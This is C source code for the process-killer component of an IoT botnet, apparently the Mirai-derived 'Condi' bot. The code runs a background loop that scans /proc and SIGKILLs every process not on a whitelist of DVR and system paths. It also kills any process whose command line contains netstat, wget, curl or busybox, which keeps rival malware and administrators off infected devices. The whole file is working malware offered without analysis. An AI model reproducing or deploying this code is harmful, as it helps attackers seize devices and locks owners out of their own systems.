#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>

#include "includes.h"
#include "killer.h"
#include "table.h"
#include "util.h"

int killer_pid = 0;

char *whitelistpaths[] = {
    "var/Challenge",
    "app/hi3511",
    "gmDVR",
    "ibox",
    "usr/dvr_main _8182T_1108",
    "mnt/mtd/app/gui",
    "var/Kylin",
    "l0 c/udevd",
    "anko-app/ankosample _8182T_1104",
    "var/tmp/sonia",
    "hicore",
    "stm_hi3511_dvr",
    "/bin/busybox",
    "/usr/lib/systemd/systemd",
    "/usr/libexec/openssh/sftp-server",
    "usr/",
    "shell",
    "mnt/",
    "sys/",
    "bin/",
    "boot/",
    "run/",
    "media/",
    "srv/",
    "var/run/",
    "sbin/",
    "lib/",
    "etc/",
    "dev/",
    "home/Davinci",
    "telnet",
    "ssh",
    "watchdog",
    "/var/spool",
    "/var/Sofia",
    "sshd",
    "/usr/compress/bin/",
    "/compress/bin",
    "/compress/usr/",
    "bash",
    "httpd",
    "telnetd",
    "dropbear",
    "ropbear",
    "encoder",
    "system",
    "/root/dvr_gui/",
    "/root/dvr_app/",
    "/anko-app/",
    "/opt/"};

void kill_malware(pid_t current_pid) {
    DIR *dir = opendir("/proc/");
    if (dir == NULL) {
        return;
    }

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            char *name = entry->d_name;
            if (name[0] >= '0' && name[0] <= '9') {
                pid_t pid = atoi(name);
                if (pid != current_pid) {
                    char path[PATH_MAX];
                    sprintf(path, "/proc/%s/exe", name);
                    char exe_path[PATH_MAX + 1];
                    ssize_t len = readlink(path, exe_path, sizeof(exe_path) - 1);
                    if (len != -1) {
                        exe_path[len] = '\0';

                        char current_exe_path[PATH_MAX + 1];
                        ssize_t current_len = readlink("/proc/self/exe", current_exe_path, sizeof(current_exe_path) - 1);
                        if (current_len != -1) {
                            current_exe_path[current_len] = '\0';
                            if (strcmp(exe_path, current_exe_path) == 0) {
                                continue;
                            }
                        }

                        if (strstr(exe_path, current_exe_path) != NULL) {
                            continue;
                        }

                        int is_whitelisted = 0;
                        for (int i = 0; i < sizeof(whitelistpaths) / sizeof(whitelistpaths[0]); i++) {
                            if (strstr(exe_path, whitelistpaths[i]) != NULL) {
                                is_whitelisted = 1;
                                break;
                            }
                        }
                        if (!is_whitelisted) {
                            kill(pid, SIGKILL);
                            #ifdef DEBUG
                            printf("(condi/killer) killing pid %d (path: %s)\n", pid, exe_path);
                            #endif
                        }
                    }
                }
            }
        }
    }

    closedir(dir);
}

void lock_commands() {
    DIR *dir;
    struct dirent *entry;
    pid_t pid;
    char path[256];

    dir = opendir("/proc");
    if (dir == NULL) {
        return;
    }

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR && strtol(entry->d_name, NULL, 10) > 0) {
            pid = (pid_t) strtol(entry->d_name, NULL, 10);
            snprintf(path, sizeof(path), "/proc/%d/cmdline", pid);
            FILE *cmdline = fopen(path, "r");
            if (cmdline) {
                char cmd[256];
                fgets(cmd, sizeof(cmd), cmdline);
                fclose(cmdline);

                if (strstr(cmd, "netstat") != NULL || strstr(cmd, "wget") != NULL || strstr(cmd, "curl") != NULL || strstr(cmd, "busybox") != NULL || strstr(cmd, "/bin/busybox") != NULL) {
                    #ifdef DEBUG
                    printf("(condi/locker) process with pid %d (%s) found and killed.\n", pid, cmd);
                    #endif
                    kill(pid, SIGKILL);
                }
            }
        }
    }

    closedir(dir);
}

void killer_kill(void) {
    if (killer_pid != 0)
        kill(killer_pid, 9);
}

void killer_init(void) {
    #ifdef DEBUG
        printf("(condi/killer) killer starting with pid %d.\n", killer_pid);
    #endif
    pid_t current_pid = getpid();

    if (!fork()) {
        while (1) {
            kill_malware(current_pid);
            lock_commands();
        }
    }
}
